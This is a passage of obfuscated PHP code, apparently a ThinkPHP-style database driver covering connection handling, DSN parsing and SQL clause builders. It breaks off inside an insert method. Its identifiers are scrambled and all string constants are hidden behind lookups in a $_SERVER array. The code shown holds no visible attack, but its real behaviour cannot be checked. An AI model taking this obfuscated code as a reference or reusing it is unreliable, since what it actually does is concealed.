think_config($Eöèè«†‹—[492]), $Eöèè«†‹—[13] => think_config($Eöèè«†‹—[653])); } } return $a”ﬁõâªÚÍ; } protected function initConnect($a£∑ûÈå¥ö = true) { if (1 == think_config($_SERVER[∞„˜ƒÑºª][18])) { $this->_linkID = $this->multiConnect($a£∑ûÈå¥ö); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($C≤•ö”‰ò± = false) { $a÷–ï∞±Õ¯ =& $_SERVER[∞„˜ƒÑºª]; static $dÓÓÿ§ë—Á = array(); if (empty($dÓÓÿ§ë—Á)) { foreach ($this->config as $E∂æ°√πÙä => $AÓƒ™≠¿úí) { $dÓÓÿ§ë—Á[$E∂æ°√πÙä] = explode($a÷–ï∞±Õ¯[47], $AÓƒ™≠¿úí); } } if (think_config($a÷–ï∞±Õ¯[654])) { if ($C≤•ö”‰ò±) { $f∏¥€µ‹ƒç = floor(mt_rand(0, think_config($a÷–ï∞±Õ¯[655]) - 1)); } else { if (is_numeric(think_config($a÷–ï∞±Õ¯[656]))) { $f∏¥€µ‹ƒç = think_config($a÷–ï∞±Õ¯[656]); } else { $f∏¥€µ‹ƒç = floor(mt_rand(think_config($a÷–ï∞±Õ¯[655]), count($dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[558]]) - 1)); } } } else { $f∏¥€µ‹ƒç = floor(mt_rand(0, count($dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[558]]) - 1)); } $Aâ÷ …í¬√ = array($a÷–ï∞±Õ¯[560] => isset($dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[560]][$f∏¥€µ‹ƒç]) ? $dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[560]][$f∏¥€µ‹ƒç] : $dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[560]][0], $a÷–ï∞±Õ¯[561] => isset($dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[561]][$f∏¥€µ‹ƒç]) ? $dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[561]][$f∏¥€µ‹ƒç] : $dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[561]][0], $a÷–ï∞±Õ¯[558] => isset($dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[558]][$f∏¥€µ‹ƒç]) ? $dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[558]][$f∏¥€µ‹ƒç] : $dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[558]][0], $a÷–ï∞±Õ¯[559] => isset($dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[559]][$f∏¥€µ‹ƒç]) ? $dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[559]][$f∏¥€µ‹ƒç] : $dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[559]][0], $a÷–ï∞±Õ¯[17] => isset($dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[17]][$f∏¥€µ‹ƒç]) ? $dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[17]][$f∏¥€µ‹ƒç] : $dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[17]][0], $a÷–ï∞±Õ¯[588] => isset($dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[588]][$f∏¥€µ‹ƒç]) ? $dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[588]][$f∏¥€µ‹ƒç] : $dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[588]][0], $a÷–ï∞±Õ¯[13] => isset($dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[13]][$f∏¥€µ‹ƒç]) ? $dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[13]][$f∏¥€µ‹ƒç] : $dÓÓÿ§ë—Á[$a÷–ï∞±Õ¯[13]][0]); return $this->connect($Aâ÷ …í¬√, $f∏¥€µ‹ƒç); } public function parseDSN($e°œﬂáÔ·á) { $CÖΩ•æÏ¢≈ =& $_SERVER[∞„˜ƒÑºª]; if (empty($e°œﬂáÔ·á)) { return !1; } $aúø†èÀ◊¥ = parse_url($e°œﬂáÔ·á); if ($aúø†èÀ◊¥[$CÖΩ•æÏ¢≈[164]]) { $a–ﬁÜª¡åË = array($CÖΩ•æÏ¢≈[636] => $aúø†èÀ◊¥[$CÖΩ•æÏ¢≈[164]], $CÖΩ•æÏ¢≈[560] => isset($aúø†èÀ◊¥[$CÖΩ•æÏ¢≈[415]]) ? $aúø†èÀ◊¥[$CÖΩ•æÏ¢≈[415]] : $CÖΩ•æÏ¢≈[33], $CÖΩ•æÏ¢≈[561] => isset($aúø†èÀ◊¥[$CÖΩ•æÏ¢≈[657]]) ? $aúø†èÀ◊¥[$CÖΩ•æÏ¢≈[657]] : $CÖΩ•æÏ¢≈[33], $CÖΩ•æÏ¢≈[558] => isset($aúø†èÀ◊¥[$CÖΩ•æÏ¢≈[165]]) ? $aúø†èÀ◊¥[$CÖΩ•æÏ¢≈[165]] : $CÖΩ•æÏ¢≈[33], $CÖΩ•æÏ¢≈[559] => isset($aúø†èÀ◊¥[$CÖΩ•æÏ¢≈[166]]) ? $aúø†èÀ◊¥[$CÖΩ•æÏ¢≈[166]] : $CÖΩ•æÏ¢≈[33], $CÖΩ•æÏ¢≈[17] => isset($aúø†èÀ◊¥[$CÖΩ•æÏ¢≈[84]]) ? substr($aúø†èÀ◊¥[$CÖΩ•æÏ¢≈[84]], 1) : $CÖΩ•æÏ¢≈[33]); } else { preg_match($CÖΩ•æÏ¢≈[658], trim($e°œﬂáÔ·á), $Fá÷†‚Ë¯‹); $a–ﬁÜª¡åË = array($CÖΩ•æÏ¢≈[636] => $Fá÷†‚Ë¯‹[1], $CÖΩ•æÏ¢≈[560] => $Fá÷†‚Ë¯‹[2], $CÖΩ•æÏ¢≈[561] => $Fá÷†‚Ë¯‹[3], $CÖΩ•æÏ¢≈[558] => $Fá÷†‚Ë¯‹[4], $CÖΩ•æÏ¢≈[559] => $Fá÷†‚Ë¯‹[5], $CÖΩ•æÏ¢≈[17] => $Fá÷†‚Ë¯‹[6]); } $a–ﬁÜª¡åË[$CÖΩ•æÏ¢≈[588]] = $CÖΩ•æÏ¢≈[33]; return $a–ﬁÜª¡åË; } protected function debug() { $bΩ ¿é‹Ωñ =& $_SERVER[∞„˜ƒÑºª]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $bΩ ¿é‹Ωñ[659]; if (think_config($bΩ ¿é‹Ωñ[660])) { think_status($bΩ ¿é‹Ωñ[661]); think_trace($this->queryStr . $bΩ ¿é‹Ωñ[662] . think_status($bΩ ¿é‹Ωñ[20], $bΩ ¿é‹Ωñ[661], 6) . $bΩ ¿é‹Ωñ[663], $bΩ ¿é‹Ωñ[33], $bΩ ¿é‹Ωñ[664]); } } protected function parseLock($e∞∞äÏ„◊— = false) { $dË€àà≤≠« =& $_SERVER[∞„˜ƒÑºª]; if (!$e∞∞äÏ„◊—) { return $dË€àà≤≠«[33]; } if ($dË€àà≤≠«[590] == $this->dbType) { return $dË€àà≤≠«[665]; } return $dË€àà≤≠«[666]; } protected function parseSet($f©Áî†Ûîø) { $e∏·ÓÇ÷ÏÖ =& $_SERVER[∞„˜ƒÑºª]; foreach ($f©Áî†Ûîø as $cãÀÈ¯ëÍê => $Dè¢´ê˜ß·) { if (is_array($Dè¢´ê˜ß·) && $e∏·ÓÇ÷ÏÖ[284] == $Dè¢´ê˜ß·[0]) { $eÑÛÖè‚è¬[] = $this->parseKey($cãÀÈ¯ëÍê) . $e∏·ÓÇ÷ÏÖ[667] . $Dè¢´ê˜ß·[1]; } elseif (is_scalar($Dè¢´ê˜ß·) || is_null($Dè¢´ê˜ß·)) { $eÑÛÖè‚è¬[] = $this->parseKey($cãÀÈ¯ëÍê) . $e∏·ÓÇ÷ÏÖ[667] . $this->parseValue($Dè¢´ê˜ß·); } } return $e∏·ÓÇ÷ÏÖ[668] . implode($e∏·ÓÇ÷ÏÖ[47], $eÑÛÖè‚è¬); } protected function bindParam($e≈√¿Õ¨èŒ, $fÇËπıÎ≠¬) { $this->bind[$_SERVER[∞„˜ƒÑºª][4] . $e≈√¿Õ¨èŒ] = $fÇËπıÎ≠¬; } protected function parseBind($bâ≤‚‘≠â±) { $bâ≤‚‘≠â± = array_merge($this->bind, $bâ≤‚‘≠â±); $this->bind = array(); return $bâ≤‚‘≠â±; } function parseKey(&$cå√Ç™’ñ¥, $B≤ãÉÖ¥”Ë = true) { if ($B≤ãÉÖ¥”Ë) { $cå√Ç™’ñ¥ = $this->parseKeyCheck($cå√Ç™’ñ¥); } return $cå√Ç™’ñ¥; } function parseKeyCheck($f≈–ÁáÌ‹°) { $Fœº‘‘ËàÒ =& $_SERVER[∞„˜ƒÑºª]; $f≈–ÁáÌ‹° = trim($f≈–ÁáÌ‹°); if (!preg_match($Fœº‘‘ËàÒ[669], $f≈–ÁáÌ‹°)) { think_exception($Fœº‘‘ËàÒ[670] . $f≈–ÁáÌ‹°); } return $f≈–ÁáÌ‹°; } protected function parseValue($FÊóç˘›Êó) { $fÍêÈ÷ﬂ–· =& $_SERVER[∞„˜ƒÑºª]; if (is_string($FÊóç˘›Êó)) { $FÊóç˘›Êó = $fÍêÈ÷ﬂ–·[629] . $this->escapeString($FÊóç˘›Êó) . $fÍêÈ÷ﬂ–·[629]; } elseif (isset($FÊóç˘›Êó[0]) && is_string($FÊóç˘›Êó[0]) && strtolower($FÊóç˘›Êó[0]) == $fÍêÈ÷ﬂ–·[284]) { $FÊóç˘›Êó = $this->escapeString($FÊóç˘›Êó[1]); } elseif (is_array($FÊóç˘›Êó)) { $FÊóç˘›Êó = array_map(array($this, $fÍêÈ÷ﬂ–·[630]), $FÊóç˘›Êó); } elseif (is_bool($FÊóç˘›Êó)) { $FÊóç˘›Êó = $FÊóç˘›Êó ? $fÍêÈ÷ﬂ–·[376] : $fÍêÈ÷ﬂ–·[402]; } elseif (is_null($FÊóç˘›Êó)) { $FÊóç˘›Êó = $fÍêÈ÷ﬂ–·[106]; } return $FÊóç˘›Êó; } protected function parseField($bîäã®°∆œ) { $C·Ë€Ü•Ñë =& $_SERVER[∞„˜ƒÑºª]; if (is_string($bîäã®°∆œ) && strpos($bîäã®°∆œ, $C·Ë€Ü•Ñë[47])) { $bîäã®°∆œ = explode($C·Ë€Ü•Ñë[47], $bîäã®°∆œ); } if (is_array($bîäã®°∆œ)) { $BÙ’›î»àä = array(); foreach ($bîäã®°∆œ as $fÕÆæ ê => $a√Æﬂ‰≈⁄Ì) { if (!is_numeric($fÕÆæ ê)) { $BÙ’›î»àä[] = $this->parseKey($fÕÆæ ê) . $C·Ë€Ü•Ñë[671] . $this->parseKey($a√Æﬂ‰≈⁄Ì); } else { $BÙ’›î»àä[] = $this->parseKey($a√Æﬂ‰≈⁄Ì); } } $Bå´ÚóÉÁµ = implode($C·Ë€Ü•Ñë[47], $BÙ’›î»àä); } elseif (is_string($bîäã®°∆œ) && !empty($bîäã®°∆œ)) { $Bå´ÚóÉÁµ = $bîäã®°∆œ; } else { $Bå´ÚóÉÁµ = $C·Ë€Ü•Ñë[172]; } return $Bå´ÚóÉÁµ; } protected function parseTable($d¿éÉ‚Ëß) { $DÉ±≥èÆàº =& $_SERVER[∞„˜ƒÑºª]; if (is_array($d¿éÉ‚Ëß)) { $c¡‡©ö —Ô = array(); foreach ($d¿éÉ‚Ëß as $D„è§ïŒ©Ê => $AèùΩä¯ÕŒ) { if (!is_numeric($D„è§ïŒ©Ê)) { $c¡‡©ö —Ô[] = $this->parseKey($D„è§ïŒ©Ê) . $DÉ±≥èÆàº[50] . $this->parseKey($AèùΩä¯ÕŒ); } else { $c¡‡©ö —Ô[] = $this->parseKey($D„è§ïŒ©Ê); } } $d¿éÉ‚Ëß = $c¡‡©ö —Ô; } elseif (is_string($d¿éÉ‚Ëß)) { if (strstr($d¿éÉ‚Ëß, $DÉ±≥èÆàº[50])) { return $d¿éÉ‚Ëß; } $d¿éÉ‚Ëß = explode($DÉ±≥èÆàº[47], $d¿éÉ‚Ëß); array_walk($d¿éÉ‚Ëß, array($this, $DÉ±≥èÆàº[577])); } return $DÉ±≥èÆàº[672] . trim(implode($DÉ±≥èÆàº[673], $d¿éÉ‚Ëß), $DÉ±≥èÆàº[583]) . $DÉ±≥èÆàº[672]; } protected function parseWhere($AõÉ«Êå‚ø) { $a‰Ë®á∞∫Ö =& $_SERVER[∞„˜ƒÑºª]; $bÉ⁄ œ™Ëı = $a‰Ë®á∞∫Ö[33]; if (is_string($AõÉ«Êå‚ø)) { $bÉ⁄ œ™Ëı = $AõÉ«Êå‚ø; } else { $B‹¶≥äË“è = isset($AõÉ«Êå‚ø[$a‰Ë®á∞∫Ö[674]]) ? strtoupper($AõÉ«Êå‚ø[$a‰Ë®á∞∫Ö[674]]) : $a‰Ë®á∞∫Ö[33]; if (in_array($B‹¶≥äË“è, array($a‰Ë®á∞∫Ö[675], $a‰Ë®á∞∫Ö[676], $a‰Ë®á∞∫Ö[677]))) { $B‹¶≥äË“è = $a‰Ë®á∞∫Ö[50] . $B‹¶≥äË“è . $a‰Ë®á∞∫Ö[50]; unset($AõÉ«Êå‚ø[$a‰Ë®á∞∫Ö[674]]); } else { $B‹¶≥äË“è = $a‰Ë®á∞∫Ö[678]; } foreach ($AõÉ«Êå‚ø as $BòîΩï˘ïŒ => $DÊÎ˘ç»≠≤) { $bÉ⁄ œ™Ëı .= $a‰Ë®á∞∫Ö[264]; if (is_numeric($BòîΩï˘ïŒ)) { $BòîΩï˘ïŒ = $a‰Ë®á∞∫Ö[679]; } if (0 === strpos($BòîΩï˘ïŒ, $a‰Ë®á∞∫Ö[79])) { $bÉ⁄ œ™Ëı .= $this->parseThinkWhere($BòîΩï˘ïŒ, $DÊÎ˘ç»≠≤); } else { if (!preg_match($a‰Ë®á∞∫Ö[680], trim($BòîΩï˘ïŒ))) { think_exception(think_lang($a‰Ë®á∞∫Ö[681]) . $a‰Ë®á∞∫Ö[4] . $BòîΩï˘ïŒ); } $AÙÖ”Â¨ÉÀ = is_array($DÊÎ˘ç»≠≤) && isset($DÊÎ˘ç»≠≤[$a‰Ë®á∞∫Ö[682]]); $BòîΩï˘ïŒ = trim($BòîΩï˘ïŒ); if (strpos($BòîΩï˘ïŒ, $a‰Ë®á∞∫Ö[270])) { $A ‡¡‘≤¡∑ = explode($a‰Ë®á∞∫Ö[270], $BòîΩï˘ïŒ); $Aàû◊ﬂÎ≥ì = array(); foreach ($A ‡¡‘≤¡∑ as $f“‹åŸ„»© => $c—€π˜°ÜÊ) { $e™êÀ∫À∂ù = $AÙÖ”Â¨ÉÀ ? $DÊÎ˘ç»≠≤[$f“‹åŸ„»©] : $DÊÎ˘ç»≠≤; $Aàû◊ﬂÎ≥ì[] = $a‰Ë®á∞∫Ö[247] . $this->parseWhereItem($this->parseKey($c—€π˜°ÜÊ), $e™êÀ∫À∂ù) . $a‰Ë®á∞∫Ö[576]; } $bÉ⁄ œ™Ëı .= implode($a‰Ë®á∞∫Ö[683], $Aàû◊ﬂÎ≥ì); } elseif (strpos($BòîΩï˘ïŒ, $a‰Ë®á∞∫Ö[271])) { $A ‡¡‘≤¡∑ = explode($a‰Ë®á∞∫Ö[271], $BòîΩï˘ïŒ); $Aàû◊ﬂÎ≥ì = array(); foreach ($A ‡¡‘≤¡∑ as $f“‹åŸ„»© => $c—€π˜°ÜÊ) { $e™êÀ∫À∂ù = $AÙÖ”Â¨ÉÀ ? $DÊÎ˘ç»≠≤[$f“‹åŸ„»©] : $DÊÎ˘ç»≠≤; $Aàû◊ﬂÎ≥ì[] = $a‰Ë®á∞∫Ö[247] . $this->parseWhereItem($this->parseKey($c—€π˜°ÜÊ), $e™êÀ∫À∂ù) . $a‰Ë®á∞∫Ö[576]; } $bÉ⁄ œ™Ëı .= implode($a‰Ë®á∞∫Ö[678], $Aàû◊ﬂÎ≥ì); } else { $bÉ⁄ œ™Ëı .= $this->parseWhereItem($this->parseKey($BòîΩï˘ïŒ), $DÊÎ˘ç»≠≤); } } $bÉ⁄ œ™Ëı .= $a‰Ë®á∞∫Ö[265] . $B‹¶≥äË“è; } $bÉ⁄ œ™Ëı = substr($bÉ⁄ œ™Ëı, 0, -strlen($B‹¶≥äË“è)); } return empty($bÉ⁄ œ™Ëı) ? $a‰Ë®á∞∫Ö[33] : $a‰Ë®á∞∫Ö[684] . $bÉ⁄ œ™Ëı; } protected function parseWhereItem($D”Üíƒı›Ô, $Eê…Ø∑íõÿ) { $bù∆ˆàãêî =& $_SERVER[∞„˜ƒÑºª]; $Cô¡¶∞∑Ã = $bù∆ˆàãêî[33]; if (is_array($Eê…Ø∑íõÿ)) { if (is_string($Eê…Ø∑íõÿ[0])) { $F£ñ≠®‹ÚŒ = strtolower($Eê…Ø∑íõÿ[0]); if (in_array($Eê…Ø∑íõÿ[0], array($bù∆ˆàãêî[667], $bù∆ˆàãêî[685], $bù∆ˆàãêî[686], $bù∆ˆàãêî[687], $bù∆ˆàãêî[688], $bù∆ˆàãêî[689]))) { $Cô¡¶∞∑Ã .= $D”Üíƒı›Ô . $bù∆ˆàãêî[50] . $Eê…Ø∑íõÿ[0] . $bù∆ˆàãêî[50] . $this->parseValue($Eê…Ø∑íõÿ[1]); } elseif (preg_match($bù∆ˆàãêî[690], $Eê…Ø∑íõÿ[0])) { $Cô¡¶∞∑Ã .= $D”Üíƒı›Ô . $bù∆ˆàãêî[50] . $this->exp[$F£ñ≠®‹ÚŒ] . $bù∆ˆàãêî[50] . $this->parseValue($Eê…Ø∑íõÿ[1]); } elseif (preg_match($bù∆ˆàãêî[691], $Eê…Ø∑íõÿ[0])) { if (is_array($Eê…Ø∑íõÿ[1])) { $D»ìÍøıÇì = isset($Eê…Ø∑íõÿ[2]) ? strtoupper($Eê…Ø∑íõÿ[2]) : $bù∆ˆàãêî[676]; if (in_array($D»ìÍøıÇì, array($bù∆ˆàãêî[675], $bù∆ˆàãêî[676], $bù∆ˆàãêî[677]))) { $b“ßõŒæÛ´ = array(); foreach ($Eê…Ø∑íõÿ[1] as $B∞ÊÌ˘˜•) { $b“ßõŒæÛ´[] = $D”Üíƒı›Ô . $bù∆ˆàãêî[50] . $this->exp[$F£ñ≠®‹ÚŒ] . $bù∆ˆàãêî[50] . $this->parseValue($B∞ÊÌ˘˜•); } $Cô¡¶∞∑Ã .= $bù∆ˆàãêî[247] . implode($bù∆ˆàãêî[50] . $D»ìÍøıÇì . $bù∆ˆàãêî[50], $b“ßõŒæÛ´) . $bù∆ˆàãêî[576]; } } else { $Cô¡¶∞∑Ã .= $D”Üíƒı›Ô . $bù∆ˆàãêî[50] . $this->exp[$F£ñ≠®‹ÚŒ] . $bù∆ˆàãêî[50] . $this->parseValue($Eê…Ø∑íõÿ[1]); } } elseif ($bù∆ˆàãêî[284] == $F£ñ≠®‹ÚŒ) { $Cô¡¶∞∑Ã .= $bù∆ˆàãêî[574] . $D”Üíƒı›Ô . $bù∆ˆàãêî[50] . $Eê…Ø∑íõÿ[1] . $bù∆ˆàãêî[692]; } elseif (preg_match($bù∆ˆàãêî[693], $Eê…Ø∑íõÿ[0])) { if (isset($Eê…Ø∑íõÿ[2]) && $bù∆ˆàãêî[284] == $Eê…Ø∑íõÿ[2]) { $Cô¡¶∞∑Ã .= $D”Üíƒı›Ô . $bù∆ˆàãêî[50] . $this->exp[$F£ñ≠®‹ÚŒ] . $bù∆ˆàãêî[50] . $Eê…Ø∑íõÿ[1]; } else { if (is_string($Eê…Ø∑íõÿ[1])) { $Eê…Ø∑íõÿ[1] = explode($bù∆ˆàãêî[47], $Eê…Ø∑íõÿ[1]); } $bèÏ∑¿ÜÜ± = implode($bù∆ˆàãêî[47], $this->parseValue($Eê…Ø∑íõÿ[1])); $Cô¡¶∞∑Ã .= $D”Üíƒı›Ô . $bù∆ˆàãêî[50] . $this->exp[$F£ñ≠®‹ÚŒ] . $bù∆ˆàãêî[574] . $bèÏ∑¿ÜÜ± . $bù∆ˆàãêî[576]; } } elseif (preg_match($bù∆ˆàãêî[694], $Eê…Ø∑íõÿ[0])) { $F‹ã∏∏™áÈ = is_string($Eê…Ø∑íõÿ[1]) ? explode($bù∆ˆàãêî[47], $Eê…Ø∑íõÿ[1]) : $Eê…Ø∑íõÿ[1]; $Cô¡¶∞∑Ã .= $bù∆ˆàãêî[574] . $D”Üíƒı›Ô . $bù∆ˆàãêî[50] . $this->exp[$F£ñ≠®‹ÚŒ] . $bù∆ˆàãêî[50] . $this->parseValue($F‹ã∏∏™áÈ[0]) . $bù∆ˆàãêî[678] . $this->parseValue($F‹ã∏∏™áÈ[1]) . $bù∆ˆàãêî[265]; } else { think_exception(think_lang($bù∆ˆàãêî[681]) . $bù∆ˆàãêî[4] . $Eê…Ø∑íõÿ[0]); } } else { $F‚‚ÜæíÂÇ = count($Eê…Ø∑íõÿ); $BÏìã£‡“· = isset($Eê…Ø∑íõÿ[$F‚‚ÜæíÂÇ - 1]) ? strtoupper($Eê…Ø∑íõÿ[$F‚‚ÜæíÂÇ - 1]) : $bù∆ˆàãêî[33]; if (in_array($BÏìã£‡“·, array($bù∆ˆàãêî[675], $bù∆ˆàãêî[676], $bù∆ˆàãêî[677]))) { $F‚‚ÜæíÂÇ = $F‚‚ÜæíÂÇ - 1; } else { $BÏìã£‡“· = $bù∆ˆàãêî[675]; } for ($fì¡ÎÂ€ŒÌ = 0; $fì¡ÎÂ€ŒÌ < $F‚‚ÜæíÂÇ; $fì¡ÎÂ€ŒÌ++) { $F‹ã∏∏™áÈ = is_array($Eê…Ø∑íõÿ[$fì¡ÎÂ€ŒÌ]) ? $Eê…Ø∑íõÿ[$fì¡ÎÂ€ŒÌ][1] : $Eê…Ø∑íõÿ[$fì¡ÎÂ€ŒÌ]; if ($bù∆ˆàãêî[284] == strtolower($Eê…Ø∑íõÿ[$fì¡ÎÂ€ŒÌ][0])) { $Cô¡¶∞∑Ã .= $bù∆ˆàãêî[247] . $D”Üíƒı›Ô . $bù∆ˆàãêî[50] . $F‹ã∏∏™áÈ . $bù∆ˆàãêî[692] . $BÏìã£‡“· . $bù∆ˆàãêî[50]; } else { $EﬁÚÏÙîµ» = is_array($Eê…Ø∑íõÿ[$fì¡ÎÂ€ŒÌ]) ? $this->exp[strtolower($Eê…Ø∑íõÿ[$fì¡ÎÂ€ŒÌ][0])] : $bù∆ˆàãêî[667]; if (!$EﬁÚÏÙîµ» && is_array($Eê…Ø∑íõÿ[$fì¡ÎÂ€ŒÌ]) && in_array($Eê…Ø∑íõÿ[$fì¡ÎÂ€ŒÌ][0], array($bù∆ˆàãêî[667], $bù∆ˆàãêî[685], $bù∆ˆàãêî[686], $bù∆ˆàãêî[687], $bù∆ˆàãêî[688], $bù∆ˆàãêî[689]))) { $EﬁÚÏÙîµ» = $Eê…Ø∑íõÿ[$fì¡ÎÂ€ŒÌ][0]; } $Cô¡¶∞∑Ã .= $bù∆ˆàãêî[247] . $D”Üíƒı›Ô . $bù∆ˆàãêî[50] . $EﬁÚÏÙîµ» . $bù∆ˆàãêî[50] . $this->parseValue($F‹ã∏∏™áÈ) . $bù∆ˆàãêî[692] . $BÏìã£‡“· . $bù∆ˆàãêî[50]; } } $Cô¡¶∞∑Ã = substr($Cô¡¶∞∑Ã, 0, -4); } } else { $Cô¡¶∞∑Ã .= $D”Üíƒı›Ô . $bù∆ˆàãêî[695] . $this->parseValue($Eê…Ø∑íõÿ); } return $Cô¡¶∞∑Ã; } protected function parseThinkWhere($bˆÜ˘ß©â¡, $c´‹‹ô∏¥◊) { $a´äµ∞üü• =& $_SERVER[∞„˜ƒÑºª]; $AÆÒÈµ ¯± = $a´äµ∞üü•[33]; switch ($bˆÜ˘ß©â¡) { case $a´äµ∞üü•[337]: $AÆÒÈµ ¯± = $c´‹‹ô∏¥◊; break; case $a´äµ∞üü•[679]: $AÆÒÈµ ¯± = is_string($c´‹‹ô∏¥◊) ? $c´‹‹ô∏¥◊ : substr($this->parseWhere($c´‹‹ô∏¥◊), 6); break; case $a´äµ∞üü•[696]: parse_str($c´‹‹ô∏¥◊, $fõêÉÿâª±); if (isset($fõêÉÿâª±[$a´äµ∞üü•[674]])) { $Bÿ√ñø›¯¡ = $a´äµ∞üü•[50] . strtoupper($fõêÉÿâª±[$a´äµ∞üü•[674]]) . $a´äµ∞üü•[50]; unset($fõêÉÿâª±[$a´äµ∞üü•[674]]); } else { $Bÿ√ñø›¯¡ = $a´äµ∞üü•[678]; } $Cÿ Ò≤¿∞ = array(); foreach ($fõêÉÿâª± as $c€ï€ºªà∑ => $DÔ†ÔãŸ£å) { $Cÿ Ò≤¿∞[] = $this->parseKey($c€ï€ºªà∑) . $a´äµ∞üü•[695] . $this->parseValue($DÔ†ÔãŸ£å); } $AÆÒÈµ ¯± = implode($Bÿ√ñø›¯¡, $Cÿ Ò≤¿∞); break; } return $AÆÒÈµ ¯±; } protected function parseLimit($b Ö√òÀôë) { $bÃ∑û¯éè¶ =& $_SERVER[∞„˜ƒÑºª]; return !empty($b Ö√òÀôë) ? $bÃ∑û¯éè¶[48] . $b Ö√òÀôë . $bÃ∑û¯éè¶[50] : $bÃ∑û¯éè¶[33]; } protected function parseJoin($aÓ¨ú±Îã≠) { $B‰ÍÎÉ†∏ç =& $_SERVER[∞„˜ƒÑºª]; $dﬂùƒˆ—ßØ = $B‰ÍÎÉ†∏ç[33]; if (!empty($aÓ¨ú±Îã≠)) { if (is_array($aÓ¨ú±Îã≠)) { foreach ($aÓ¨ú±Îã≠ as $A‚ÒÿÈ˜Ωà => $aÕ™÷Ñÿ ù) { if (!1 !== stripos($aÕ™÷Ñÿ ù, $B‰ÍÎÉ†∏ç[697])) { $dﬂùƒˆ—ßØ .= $B‰ÍÎÉ†∏ç[50] . $aÕ™÷Ñÿ ù; } else { $dﬂùƒˆ—ßØ .= $B‰ÍÎÉ†∏ç[698] . $aÕ™÷Ñÿ ù; } } } else { $dﬂùƒˆ—ßØ .= $B‰ÍÎÉ†∏ç[698] . $aÓ¨ú±Îã≠; } } $dﬂùƒˆ—ßØ = preg_replace($B‰ÍÎÉ†∏ç[699], think_config($B‰ÍÎÉ†∏ç[602]) . $B‰ÍÎÉ†∏ç[700], $dﬂùƒˆ—ßØ); return $dﬂùƒˆ—ßØ; } protected function parseOrder($cœãÑ™Ñ•ù) { $A¨æëâœ”à =& $_SERVER[∞„˜ƒÑºª]; if (is_array($cœãÑ™Ñ•ù)) { $Aç’™Îàûé = array(); foreach ($cœãÑ™Ñ•ù as $F±ñÓå≠ÜÇ => $EÉñ¨œê±Á) { if (is_numeric($F±ñÓå≠ÜÇ)) { $Aç’™Îàûé[] = $this->parseKey($EÉñ¨œê±Á); } else { $EÉñ¨œê±Á = in_array(strtoupper(trim($EÉñ¨œê±Á)), array($A¨æëâœ”à[701], $A¨æëâœ”à[702])) ? $A¨æëâœ”à[50] . $EÉñ¨œê±Á : $A¨æëâœ”à[33]; if (preg_match($A¨æëâœ”à[703], $F±ñÓå≠ÜÇ)) { $Aç’™Îàûé[] = $this->parseKey($F±ñÓå≠ÜÇ) . $EÉñ¨œê±Á; } else { think_exception($A¨æëâœ”à[704] . $F±ñÓå≠ÜÇ); } } } $cœãÑ™Ñ•ù = implode($A¨æëâœ”à[47], $Aç’™Îàûé); } return !empty($cœãÑ™Ñ•ù) ? $A¨æëâœ”à[705] . $cœãÑ™Ñ•ù : $A¨æëâœ”à[33]; } protected function parseGroup($fÜæè€Î“Ú) { $BÜ€ñÿ◊ÉÚ =& $_SERVER[∞„˜ƒÑºª]; return !empty($fÜæè€Î“Ú) ? $BÜ€ñÿ◊ÉÚ[706] . $fÜæè€Î“Ú : $BÜ€ñÿ◊ÉÚ[33]; } protected function parseHaving($F™πΩóéÎˆ) { $Cø™¨Ø‡«– =& $_SERVER[∞„˜ƒÑºª]; return !empty($F™πΩóéÎˆ) ? $Cø™¨Ø‡«–[707] . $F™πΩóéÎˆ : $Cø™¨Ø‡«–[33]; } protected function parseComment($cÜ∂ø“ì·‰) { $dı˘•†¿•ñ =& $_SERVER[∞„˜ƒÑºª]; return !empty($cÜ∂ø“ì·‰) ? $dı˘•†¿•ñ[708] . $cÜ∂ø“ì·‰ . $dı˘•†¿•ñ[709] : $dı˘•†¿•ñ[33]; } protected function parseDistinct($b Î∞‹ï⁄⁄) { $Då≈ˆæéµ =& $_SERVER[∞„˜ƒÑºª]; return !empty($b Î∞‹ï⁄⁄) ? $Då≈ˆæéµ[710] : $Då≈ˆæéµ[33]; } protected function parseUnion($cØãÛ«íÖä) { $c¿ìÍ™¬√Ü =& $_SERVER[∞„˜ƒÑºª]; if (empty($cØãÛ«íÖä)) { return $c¿ìÍ™¬√Ü[33]; } if (isset($cØãÛ«íÖä[$c¿ìÍ™¬√Ü[335]])) { $fÂ¿ªÍ‹Ùƒ = $c¿ìÍ™¬√Ü[711]; unset($cØãÛ«íÖä[$c¿ìÍ™¬√Ü[335]]); } else { $fÂ¿ªÍ‹Ùƒ = $c¿ìÍ™¬√Ü[712]; } foreach ($cØãÛ«íÖä as $Bòó—à›•Œ) { $aÏäÌ—·”Ç[] = $fÂ¿ªÍ‹Ùƒ . (is_array($Bòó—à›•Œ) ? $this->buildSelectSql($Bòó—à›•Œ) : $Bòó—à›•Œ); } return implode($c¿ìÍ™¬√Ü[50], $aÏäÌ—·”Ç); } public function insert($A‡ö»Ÿ∆äö, $f˘Ø≥ùã»Ω = array(), $dÊØ‘Éåë≥ = false) { goto FÁ¿∫™„‚º; fØ†Èøã¨Ê: $fâÛ¶éÚãâ .= $this->parseComment(!empty($f˘Ø≥ùã»Ω[$F›Õ‹ŸΩŸ©[339]]) ? $f˘Ø≥ùã»Ω[$F›Õ‹ŸΩŸ©[339]] : 